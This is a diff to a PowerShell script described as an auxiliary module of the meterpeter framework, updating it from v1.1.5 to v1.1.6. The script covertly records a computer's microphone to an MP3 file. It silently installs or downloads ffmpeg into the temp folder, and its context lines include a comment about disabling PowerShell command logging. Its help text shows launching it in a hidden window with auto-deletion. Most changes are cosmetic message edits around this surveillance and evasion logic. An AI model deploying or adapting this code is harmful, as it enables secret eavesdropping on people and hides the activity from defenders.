@@ -6,19 +6,23 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: ffmpeg.exe {auto-download}
    Optional Dependencies: Curl, WinGet {native}
-   PS cmdlet Dev version: v1.1.5
+   PS cmdlet Dev version: v1.1.6
 
 .DESCRIPTION
    Auxiliary Module of meterpeter v2.10.14.1 that records native
    microphone audio until -rectime <seconds> parameter its reached
 
 .NOTES
-   The first time this cmdlet runs it checks if ffmpeg.exe its
-   present in -workingdir "$Env:TMP". If not it downloads it from
-   GitHub repo (download takes aprox 2 minutes) before execute it.
+   The first time this cmdlet runs, it checks if ffmpeg.exe its present in
+   -workingdir "$Env:TMP". If not, it downloads it from GitHub repo (download
+   takes aprox 2 minutes) and execute it, at 2º time run it will start recording
+   audio instantly without the need to download or install ffmpeng codec again.
+
+   -download 'Store'  - downloads\install\executes ffmpeg.exe using WinGet
+   -download 'GitHub' - downloads\execute ffmpeg.exe from working dir (%TMP%)
 
 .Parameter workingDir
-   cmdlet working directory (default: $Env:TMP)
+   Cmdlet working directory (default: $Env:TMP)
 
 .Parameter Mp3Name
    The audio file name (default: AudioClip.mp3)
@@ -27,7 +31,7 @@
    Record audio for xx seconds (default: 10)
 
 .Parameter Download
-   Download from Store or GitHub? (default: GitHub)
+   Download ffmpeg from Store|GitHub (default: GitHub)
 
 .Parameter Random
    Switch that random generates Mp3 filename
@@ -45,7 +49,11 @@
 
 .EXAMPLE
    PS C:\> .\rec_audio.ps1 -random -download 'GitHub'
-   Random generate MP3 file name (create multiple files)
+   Download ffmpeg from GitHub, random generate MP3 file name
+
+.EXAMPLE
+   PS C:\> .\rec_audio.ps1 -uninstall
+   UnInstall ffmpeg from MStore [local]
 
 .EXAMPLE
    PS C:\> Start-Process -windowstyle hidden powershell -argumentlist "-file rec_audio.ps1 -rectime 60 -autodelete"
@@ -97,7 +105,7 @@
 )
 
 
-$cmdletver = "v1.1.5"
+$cmdletver = "v1.1.6"
 $IPath = (Get-Location).Path.ToString()
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
@@ -158,7 +166,7 @@ If($Download -imatch '^(Store)$')
 
    .OUTPUTS
       [!!] 🔌 record native microphone audio 🔌
-      [**] searching for program 'FFmpeg' [local\remote]
+      [**] searching program 'FFmpeg' [local|remote]
       Encontrado FFmpeg [Gyan.FFmpeg] Versão 6.1.1
       Este aplicativo é licenciado para você pelo proprietário.
       A Microsoft não é responsável por, nem concede licenças a pacotes de terceiros.
@@ -193,11 +201,11 @@ If($Download -imatch '^(Store)$')
    #>
 
    ## Make sure Pacakage its not already intalled
-   write-host "[**] searching for program 'FFmpeg' [local\remote]" -ForegroundColor Green
+   write-host "[**] searching program 'FFmpeg' [local|remote]" -ForegroundColor Green
    $CheckLocal = (winget list|findstr /C:"FFmpeg")
    If(-not([string]::IsNullOrEmpty($CheckLocal)))
    {
-      write-host "[Ko] Error: program 'FFmpeg' already installed!" -ForegroundColor Red   
+      write-host "[Ok] program 'FFmpeg' installed! [local]" -ForegroundColor Red   
    }
    Else
    {
@@ -214,10 +222,11 @@ If($Download -imatch '^(Store)$')
       winget install --name "FFmpeg" --id "Gyan.FFmpeg" --silent --force --accept-package-agreements --accept-source-agreements --disable-interactivity
       If($? -match 'false')
       {
-         write-host "[Ko] Error: fail installing program 'FFmpeg' id 'Gyan.FFmpeg' from msstore`n" -ForegroundColor Red
+         write-host "[Ko] fail: installing program 'FFmpeg' id 'Gyan.FFmpeg' from msstore`n" -ForegroundColor Red
          cd "$IPath"
          return      
       }
+      write-host ""
    }
 }
 Else
@@ -231,7 +240,7 @@ Else
       https://adamtheautomator.com/install-ffmpeg
 
    .OUTPUTS
-      [!!] �� record native microphone audio ��
+      [!!] 🔌 record native microphone audio 🔌
       [**] downloading : ffmpeg-release-essentials.zip
 
         % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -275,7 +284,7 @@ Else
       Expand-Archive "$WorkingDir\ffmpeg_64.zip" -DestinationPath "$WorkingDir" -force
       If(-not(Test-Path "$WorkingDir\ffmpeg-6.1.1-essentials_build"))
       {
-         write-host "[Ko] fail expanding ffmpeg_64.zip archive`n" -ForegroundColor Red
+         write-host "[Ko] fail expanding ffmpeg_64.zip archive" -ForegroundColor Red
       }
 
       ## Move ffmpeg.exe from ffmpeg-master-latest-win64-gpl directory to 'cmdlet working directory'
@@ -284,6 +293,7 @@ Else
       ## CleanUp of files left behind
       Remove-Item -Path "$WorkingDir\ffmpeg-6.1.1-essentials_build" -Force -Recurse
       Remove-Item -Path "$WorkingDir\ffmpeg_64.zip" -Force
+      write-host ""
    }
 
    ## Make sure we have downloaded ffmpeg.exe!
@@ -321,7 +331,7 @@ Else
 
 If($Download -imatch '^(Store)$')
 {
-   write-host "`n[**] " -ForegroundColor Green -NoNewline
+   write-host "[**] " -ForegroundColor Green -NoNewline
    write-host "executing   : " -NoNewline;write-host "ffmpeg program (WinGet Location)" -ForegroundColor Green
    $SearchForFFmpeg = (GCI -Path "$Env:LOCALAPPDATA\Microsoft\winget\Packages" -Recurse|Select-Object *).FullName|Where-Object{$_ -match '(ffmpeg.exe)$'}
    $FFmpegInstallPath = $SearchForFFmpeg -replace '\\ffmpeg.exe',''
@@ -332,7 +342,7 @@ If($Download -imatch '^(Store)$')
 }
 Else
 {
-   write-host "`n[**] " -ForegroundColor Green -NoNewline;write-host "executing   : " -NoNewline
+   write-host "[**] " -ForegroundColor Green -NoNewline;write-host "executing   : " -NoNewline
    write-host "ffmpeg.exe" -ForegroundColor Green -NoNewline;write-host " from '" -NoNewline
    write-host "$WorkingDir" -ForegroundColor Green -NoNewline;write-host "'"
    .\ffmpeg.exe -y -hide_banner -f dshow -i audio="$MicName" -t $RecTime -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $MP3Path;
